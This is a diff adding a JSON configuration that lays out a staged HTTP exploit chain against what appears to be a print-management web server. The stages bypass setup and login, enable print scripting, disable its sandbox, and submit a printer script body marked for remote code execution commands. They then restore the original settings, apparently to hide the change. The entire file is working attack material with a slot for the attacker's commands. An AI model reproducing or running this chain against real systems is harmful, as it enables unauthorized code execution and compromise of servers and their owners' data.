@@ -1,0 +1,124 @@
+{
+  "stage0": {
+    "target_path": "/app",
+    "payload": {
+      "service": "direct/1/SetupCompleted/$Form",
+      "sp": "S0",
+      "Form0": "$Hidden,analyticsEnabled,$Submit",
+      "$Hidden": "true",
+      "$Submit": "Login"
+    }
+  },
+  "stage1a": {
+    "target_path": "/app",
+    "payload": {
+      "service": "direct/1/ConfigEditor/quickFindForm",
+      "sp": "S0",
+      "Form0": "$TextField,doQuickFind,clear",
+      "TextField": "print-and-device.script.enabled",
+      "doQuickFind": "Go"
+    }
+  },
+  "stage1b": {
+    "target_path": "/app",
+    "payload": {
+      "service": "direct/1/ConfigEditor/$Form",
+      "sp": "S0",
+      "Form0": "$TextField$0,$Submit,$Submit$0",
+      "$TextField$0": "Y",
+      "$Submit": "Update"
+    }
+  },
+  "stage1c": {
+    "target_path": "/app",
+    "payload": {
+      "service": "direct/1/ConfigEditor/quickFindForm",
+      "sp": "S0",
+      "Form0": "$TextField,doQuickFind,clear",
+      "TextField": "print.script.sandboxed",
+      "doQuickFind": "Go"
+    }
+  },
+  "stage1d": {
+    "target_path": "/app",
+    "payload": {
+      "service": "direct/1/ConfigEditor/$Form",
+      "sp": "S0",
+      "Form0": "$TextField$0,$Submit,$Submit$0",
+      "$TextField$0": "N",
+      "$Submit": "Update"
+    }
+  },
+  "stage2a": {
+    "target_path": "/app?service=page/PrinterList",
+    "payload": {
+      "service": "page/PrinterList"
+    }
+  },
+  "stage2b": {
+    "target_path": "/app?service=direct/1/PrinterList/selectPrinter&sp=l1001",
+    "payload": {
+      "service": "direct/1/PrinterList/selectPrinter",
+      "sp": "l1001"
+    }
+  },
+  "stage2c": {
+    "target_path": "/app",
+    "payload": {
+      "service": "direct/1/PrinterDetails/printerOptionsTab.tab",
+      "sp": "4"
+    }
+  },
+  "stage2d": {
+    "target_path": "/app",
+    "payload": {
+      "service": "direct/1/PrinterDetails/$PrinterDetailsScript.$Form",
+      "sp": "S0",
+      "Form0": "printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1",
+      "printerId": "l1001",
+      "enablePrintScript": "on",
+      "scriptBody": "!! REPLACE WITH RCE COMMANDS !!",
+      "$Submit$1": "Apply"
+    }
+  },
+  "stage3a": {
+    "target_path": "/app",
+    "payload": {
+      "service": "direct/1/ConfigEditor/quickFindForm",
+      "sp": "S0",
+      "Form0": "$TextField,doQuickFind,clear",
+      "TextField": "print-and-device.script.enabled",
+      "doQuickFind": "Go"
+    }
+  },
+  "stage3b": {
+    "target_path": "/app",
+    "payload": {
+      "service": "direct/1/ConfigEditor/$Form",
+      "sp": "S0",
+      "Form0": "$TextField$0,$Submit,$Submit$0",
+      "$TextField$0": "N",
+      "$Submit": "Update"
+    }
+  },
+  "stage3c": {
+    "target_path": "/app",
+    "payload": {
+      "service": "direct/1/ConfigEditor/quickFindForm",
+      "sp": "S0",
+      "Form0": "$TextField,doQuickFind,clear",
+      "TextField": "print.script.sandboxed",
+      "doQuickFind": "Go"
+    }
+  },
+  "stage3d": {
+    "target_path": "/app",
+    "payload": {
+      "service": "direct/1/ConfigEditor/$Form",
+      "sp": "S0",
+      "Form0": "$TextField$0,$Submit,$Submit$0",
+      "$TextField$0": "Y",
+      "$Submit": "Update"
+    }
+  }
+}
